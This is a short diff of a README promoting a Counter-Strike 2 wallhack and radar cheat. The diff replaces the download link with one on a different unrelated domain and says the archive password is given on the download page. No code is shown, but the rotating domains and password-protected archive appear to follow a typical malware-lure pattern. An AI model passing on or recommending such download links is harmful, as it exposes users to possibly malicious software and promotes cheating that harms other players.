@@ -18,7 +18,7 @@ CS2 pure wallhack and radar — see all CT and T positions in real time.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/cs2wh3)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/cs2wh3)
 
 > The archive password is shown on the download page.
 
